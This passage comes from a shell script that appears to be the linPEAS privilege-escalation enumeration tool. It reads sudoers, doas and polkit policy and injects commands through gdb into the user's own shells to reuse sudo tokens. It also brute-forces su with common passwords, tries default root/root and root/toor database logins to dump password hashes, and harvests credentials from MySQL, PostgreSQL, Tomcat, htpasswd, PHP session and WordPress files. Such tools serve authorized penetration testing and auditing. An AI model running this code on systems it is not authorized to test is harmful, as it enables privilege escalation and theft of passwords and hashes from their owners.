( grep -Iv "^$" cat /etc/sudoers | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" ) 2>/dev/null  || echo_not_found "/etc/sudoers"
if ! [ "$IAMROOT" ] && [ -w '/etc/sudoers.d/' ]; then
  echo "You can create a file in /etc/sudoers.d/ and escalate privileges" | sed -${E} "s,.*,${SED_RED_YELLOW},"
fi
for filename in '/etc/sudoers.d/*'; do
  if [ -r "$filename" ]; then
    echo "Sudoers file: $filename is readable" | sed -${E} "s,.*,${SED_RED},g"
    grep -Iv "^$" "$filename" | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" 
  fi
done
echo ""

print_2title "Checking sudo tokens"
print_info "doer tickets"
ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then echo "ptrace protection is disabled (0)" | sed "s,is disabled,${SED_RED},g";
else echo "ptrace protection is enabled ($ptrace_scope)" | sed "s,is enabled,${SED_GREEN},g";
fi
is_gdb="$(command -v gdb 2>/dev/null)"
if [ "$is_gdb" ]; then echo "gdb was found in PATH" | sed -${E} "s,.*,${SED_RED},g";
else echo "gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it" | sed "s,gdb,${SED_GREEN},g";
fi
if [ ! "$SUPERFAST" ] && [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ] && [ "$is_gdb" ]; then
  echo "Checking for sudo tokens in other shells owned by current user"
  for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" 2>/dev/null | grep -v "^$$\$"); do
    echo "Injecting process $pid -> "$(cat "/proc/$pid/comm" 2>/dev/null)
    echo 'call system("echo | sudo -S touch /tmp/shrndom32r2r >/dev/null 2>&1 && echo | sudo -S chmod 777 /tmp/shrndom32r2r >/dev/null 2>&1")' | gdb -q -n -p "$pid" >/dev/null 2>&1
    if [ -f "/tmp/shrndom32r2r" ]; then
      echo "Sudo token reuse exploit worked with pid:$pid! (see link)" | sed -${E} "s,.*,${SED_RED_YELLOW},";
      break
    fi
  done
  if [ -f "/tmp/shrndom32r2r" ]; then
    rm -f /tmp/shrndom32r2r 2>/dev/null
  else echo "The escalation didnt work... (try again later?)"
  fi
fi
echo "hj"

if [ "$(command -v doas 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Checking doas.conf"
  doas_dir_name=$(dirname "$(command -v doas)" 2>/dev/null)
  if [ "$(cat /etc/doas.conf $doas_dir_name/doas.conf $doas_dir_name/../etc/doas.conf $doas_dir_name/etc/doas.conf 2>/dev/null)" ]; then 
    cat /etc/doas.conf "$doas_dir_name/doas.conf" "$doas_dir_name/../etc/doas.conf" "$doas_dir_name/etc/doas.conf" 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_RED}," | sed "s,root,${SED_RED}," | sed "s,nopass,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW},"
  else echo_not_found "doas.conf"
  fi
  echo ""
fi


print_2title "Checking Pkexec policy"
print_info "pkpkpkexkpkec"
(cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED}," | sed -${E} "s,$groupsVB,${SED_RED}," | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW}," | sed -${E} "s,$Groups,${SED_RED_YELLOW},") || echo_not_found "/etc/polkit-1/localauthority.conf.d"
echo ""


print_2title "Superusers"
awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED_YELLOW}," | sed "s,root,${SED_RED},"
echo ""

print_2title "Users with console"
if [ "$MACPEAS" ]; then
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if grep -q "$ushell" /etc/shells; then 
      dscl . -read "/Users/$uname" UserShell RealName RecordName Password NFSHomeDirectory 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
      echo ""
    fi
  done
else
  no_shells=$(grep -Ev "sh$" /etc/passwd 2>/dev/null | cut -d ':' -f 7 | sort | uniq)
  unexpected_shells=""
  printf "%s\n" "$no_shells" | while read f; do
    if $f -c 'whoami' 2>/dev/null | grep -q "$USER"; then
      unexpected_shells="$f\n$unexpected_shells"
    fi
  done
  grep "sh$" /etc/passwd 2>/dev/null | sort | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  if [ "$unexpected_shells" ]; then
    printf "%s" "These unexpected binaries are acting like shells:\n$unexpected_shells" | sed -${E} "s,/.*,${SED_RED},g"
    echo "Unexpected users with shells:"
    printf "%s\n" "$unexpected_shells" | while read f; do
      if [ "$f" ]; then
        grep -E "${f}$" /etc/passwd | sed -${E} "s,/.*,${SED_RED},g"
      fi
    done
  fi
fi
echo ""

print_2title "All users & groups"
if [ "$MACPEAS" ]; then
  dscl . list /Users | while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
else
  cut -d":" -f1 /etc/passwd 2>/dev/null| while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
fi
echo ""


print_2title "Login now"
(w || who || finger || users) 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
echo ""

print_2title "Last logons"
(last -Faiw || last) 2>/dev/null | tail | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_RED}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
echo ""

print_2title "Last time logon each user"
lastlog 2>/dev/null | grep -v "Never" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"

EXISTS_FINGER="$(command -v finger 2>/dev/null)"
if [ "$MACPEAS" ] && [ "$EXISTS_FINGER" ]; then
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if grep -q "$ushell" /etc/shells; then 
      finger "$uname" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
      echo ""
    fi
  done
fi
echo ""

if [ "$EXTRA_CHECKS" ]; then
  print_2title "Password policy"
  grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null || echo_not_found "/etc/login.defs"
  echo ""

  if [ "$MACPEAS" ]; then
    print_2title "Relevant last user info and user configs"
    defaults read /Library/Preferences/com.apple.loginwindow.plist 2>/dev/null
    echo ""

    print_2title "Guest user status"
    sysadminctl -afpGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    sysadminctl -guestAccount status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    sysadminctl -smbGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    echo ""
  fi
fi

EXISTS_SUDO="$(command -v sudo 2>/dev/null)"
if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ] && ! [ "$IAMROOT" ] && [ "$EXISTS_SUDO" ]; then
  print_2title "Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
  POSSIBE_SU_BRUTE=$(check_if_su_brute);
  if [ "$POSSIBE_SU_BRUTE" ]; then
    SHELLUSERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
    printf "%s\n" "$SHELLUSERS" | while read u; do
      echo "  Bruteforcing user $u..."
      su_brute_user_num "$u" $PASSTRY
    done
  else
    printf $GREEN"It's not possible to brute-force su.\n\n"$NC
  fi
else
  print_2title "Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)\n"$NC
fi
print_2title "Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!\n"$NC

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q software_information; then
print_title "Software Information"

NGINX_KNOWN_MODULES="ngx_http_geoip_module.so|ngx_http_xslt_filter_module.so|ngx_stream_geoip_module.so|ngx_http_image_filter_module.so|ngx_mail_module.so|ngx_stream_module.so"


if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Useful software"
  for tool in $USEFUL_SOFTWARE; do command -v "$tool"; done
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Installed Compilers"
  (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; command -v gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/");
  echo ""

  if [ "$(command -v pkg 2>/dev/null)" ]; then
      print_2title "Vulnerable Packages"
      pkg audit -F | sed -${E} "s,vulnerable,${SED_RED},g"
      echo ""
  fi

  if [ "$(command -v brew 2>/dev/null)" ]; then
      print_2title "Brew Installed Packages"
      brew list
      echo ""
  fi
fi

if [ "$MACPEAS" ]; then
    print_2title "Writable Installed Applications"
    system_profiler SPApplicationsDataType | grep "Location:" | cut -d ":" -f 2 | cut -c2- | while read f; do
        if [ -w "$f" ]; then
            echo "$f is writable" | sed -${E} "s,.*,${SED_RED},g"
        fi
    done

    system_profiler SPFrameworksDataType | grep "Location:" | cut -d ":" -f 2 | cut -c2- | while read f; do
        if [ -w "$f" ]; then
            echo "$f is writable" | sed -${E} "s,.*,${SED_RED},g"
        fi
    done
fi

if [ "$(command -v mysql)" ] || [ "$(command -v mysqladmin)" ] || [ "$DEBUG" ]; then
  print_2title "MySQL version"
  mysql --version 2>/dev/null || echo_not_found "mysql"
  mysqluser=$(systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1)
  if [ "$mysqluser" ]; then
    echo "MySQL user: $mysqluser" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  fi
  echo ""
  echo ""

  print_list "MySQL connection using default root/root ........... "
  mysqlconnect=$(mysqladmin -uroot -proot version 2>/dev/null)
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
    mysql -u root --password=root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "MySQL connection using root/toor ................... "
  mysqlconnect=$(mysqladmin -uroot -ptoor version 2>/dev/null)
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
    mysql -u root --password=toor -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  mysqlconnectnopass=$(mysqladmin -uroot version 2>/dev/null)
  print_list "MySQL connection using root/NOPASS ................. "
  if [ "$mysqlconnectnopass" ]; then
    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
    mysql -u root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi
  echo ""
fi

if [ "$PSTORAGE_MYSQL" ] || [ "$DEBUG" ]; then
  print_2title "Searching mysql credentials and exec"
  printf "%s\n" "$PSTORAGE_MYSQL" | while read d; do
    if [ -f "$d" ] && ! [ "$(basename $d)" = "mysql" ]; then 
      STRINGS="`command -v strings`"
      echo "Potential file containing credentials:"
      ls -l "$d"
      if [ "$STRINGS" ]; then
        strings "$d"
      else
        echo "Strings not found, cat the file and check it to get the creds"
      fi

    else
      for f in $(find $d -name debian.cnf 2>/dev/null); do
        if [ -r "$f" ]; then
          echo "We can read the mysql debian.cnf. You can use this username/password to log in MySQL" | sed -${E} "s,.*,${SED_RED},"
          cat "$f"
        fi
      done
      
      for f in $(find $d -name user.MYD 2>/dev/null); do
        if [ -r "$f" ]; then
          echo "We can read the Mysql Hashes from $f" | sed -${E} "s,.*,${SED_RED},"
          grep -oaE "[-_\.\*a-Z0-9]{3,}" "$f" | grep -v "mysql_native_password"
        fi
      done
      
      for f in $(grep -lr "user\s*=" $d 2>/dev/null | grep -v "debian.cnf"); do
        if [ -r "$f" ]; then
          u=$(cat "$f" | grep -v "#" | grep "user" | grep "=" 2>/dev/null)
          echo "From '$f' Mysql user: $u" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
        fi
      done
      
      for f in $(find $d -name my.cnf 2>/dev/null); do
        if [ -r "$f" ]; then
          echo "Found readable $f"
          grep -v "^#" "$f" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -Iv "^$" | sed "s,password.*,${SED_RED},"
        fi
      done
    fi
    
    mysqlexec=$(whereis lib_mysqludf_sys.so 2>/dev/null | grep "lib_mysqludf_sys\.so")
    if [ "$mysqlexec" ]; then
      echo "Found $mysqlexec"
      echo "If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
fi
echo ""

if [ "$PSTORAGE_MARIADB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing MariaDB Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MARIADB\" | grep -E \"mariadb\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mariadb.cnf"; fi; fi; printf "%s" "$PSTORAGE_MARIADB" | grep -E "mariadb\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mariadb\.cnf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user.*|password.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_MARIADB\" | grep -E \"debian\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "debian.cnf"; fi; fi; printf "%s" "$PSTORAGE_MARIADB" | grep -E "debian\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,debian\.cnf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "user.*|password.*" | sed -${E} "s,user.*|password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_POSTGRESQL" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PostgreSQL Files (limit 70)"
    echo "Version: $(warn_exec psql -V 2>/dev/null)"
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgadmin.*\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgadmin*.db"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgadmin.*\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgadmin.*\.db$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pg_hba\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pg_hba.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pg_hba\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pg_hba\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"postgresql\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "postgresql.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "postgresql\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,postgresql\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgsql\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgsql.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgsql\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgsql\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
fi

if [ "$TIMEOUT" ] && [ "$(command -v psql)" ] || [ "$DEBUG" ]; then 
  print_list "PostgreSQL connection to template0 using postgres/NOPASS ........ "
  if [ "$(timeout 1 psql -U postgres -d template0 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "PostgreSQL connection to template1 using postgres/NOPASS ........ "
  if [ "$(timeout 1 psql -U postgres -d template1 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "PostgreSQL connection to template0 using pgsql/NOPASS ........... "
  if [ "$(timeout 1 psql -U pgsql -d template0 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "PostgreSQL connection to template1 using pgsql/NOPASS ........... "
  if [ "$(timeout 1 psql -U pgsql -d template1 -c 'select version()' 2> /dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi
  echo ""
fi

if [ "$PSTORAGE_MONGO" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Mongo Files (limit 70)"
    echo "Version: $(warn_exec mongo --version 2>/dev/null; warn_exec mongod --version 2>/dev/null)"
    if [ "$(command -v mongo)" ]; then echo "show dbs" | mongo 127.0.0.1 > /dev/null 2>&1;[ "$?" == "0" ] && echo "Possible mongo anonymous authentication" | sed -${E} "s,.*|kube,${SED_RED},"; fi
    if ! [ "`echo \"$PSTORAGE_MONGO\" | grep -E \"mongod.*\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mongod*.conf"; fi; fi; printf "%s" "$PSTORAGE_MONGO" | grep -E "mongod.*\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mongod.*\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#"; done; echo "";
fi


if [ "$PSTORAGE_APACHE_NGINX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Apache-Nginx Files (limit 70)"
    echo "Apache version: $(warn_exec apache2 -v 2>/dev/null; warn_exec httpd -v 2>/dev/null)"
    echo "Nginx version: $(warn_exec nginx -v 2>/dev/null)"
    if [ -d "/etc/apache2" ] && [ -r "/etc/apache2" ]; then grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null; fi
    if [ -d "/usr/share/nginx/modules" ] && [ -r "/usr/share/nginx/modules" ]; then print_3title 'Nginx modules'; ls /usr/share/nginx/modules | sed -${E} "s,$NGINX_KNOWN_MODULES,${SED_GREEN},g"; fi
    print_3title 'PHP exec extensions'
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"sites-enabled$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites-enabled"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "sites-enabled$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites-enabled$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,AuthType|AuthName|AuthUserFile|ServerName|ServerAlias|command on,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"000-default\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "000-default.conf"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "000-default\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,000-default\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,AuthType|AuthName|AuthUserFile|ServerName|ServerAlias,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"php\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "php.ini"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "php\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,php\.ini$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E allow_ | grep -Ev "^;" | sed -${E} "s,On,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"nginx\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "nginx.conf"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "nginx\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,nginx\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,location.*.php$|$uri|$document_uri|proxy_intercept_errors.*on|proxy_hide_header.*|merge_slashes.*on|resolver.*|proxy_pass|internal|location.+[a-zA-Z0-9][^/]\s+\{|map|proxy_set_header.*Upgrade.*http_upgrade|proxy_set_header.*Connection.*http_connection,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"nginx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "nginx"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "nginx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,nginx$,${SED_RED},"; find "$f" -name "*.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,location.*.php$|$uri|$document_uri|proxy_intercept_errors.*on|proxy_hide_header.*|merge_slashes.*on|resolver.*|proxy_pass|internal|location.+[a-zA-Z0-9][^/]\s+\{|map|proxy_set_header.*Upgrade.*http_upgrade|proxy_set_header.*Connection.*http_connection,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_TOMCAT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Tomcat Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_TOMCAT\" | grep -E \"tomcat-users\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "tomcat-users.xml"; fi; fi; printf "%s" "$PSTORAGE_TOMCAT" | grep -E "tomcat-users\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,tomcat-users\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "username=|password=" | sed -${E} "s,dbtype|dbhost|dbuser|dbhost|dbpass|dbport,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_FASTCGI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing FastCGI Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FASTCGI\" | grep -E \"fastcgi_params$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "fastcgi_params"; fi; fi; printf "%s" "$PSTORAGE_FASTCGI" | grep -E "fastcgi_params$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,fastcgi_params$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "DB_NAME|DB_USER|DB_PASS" | sed -${E} "s,DB_NAME|DB_USER|DB_PASS,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_HTTP_CONF" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Http conf Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_HTTP_CONF\" | grep -E \"httpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "httpd.conf"; fi; fi; printf "%s" "$PSTORAGE_HTTP_CONF" | grep -E "httpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,httpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "htaccess.*|htpasswd.*" | grep -Ev "\W+\#|^#" | sed -${E} "s,htaccess.*|htpasswd.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_HTPASSWD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Htpasswd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_HTPASSWD\" | grep -E \"\.htpasswd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".htpasswd"; fi; fi; printf "%s" "$PSTORAGE_HTPASSWD" | grep -E "\.htpasswd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.htpasswd$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_PHP_SESSIONS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PHP Sessions Files (limit 70)"
    ls /var/lib/php/sessions 2>/dev/null || echo_not_found /var/lib/php/sessions
    if ! [ "`echo \"$PSTORAGE_PHP_SESSIONS\" | grep -E \"sess_.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sess_*"; fi; fi; printf "%s" "$PSTORAGE_PHP_SESSIONS" | grep -E "sess_.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sess_.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_WORDPRESS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Wordpress Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WORDPRESS\" | grep -E \"wp-config\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wp-config.php"; fi; fi; printf "%s" "$PSTORAGE_WORDPRESS" | grep -E "wp-config\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wp-config\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "PASSWORD|USER|NAME|HOST" | sed -${E} "s,PASSWORD|USER|NAME|HOST,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_DRUPAL" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Drupal Files (limit 70)"
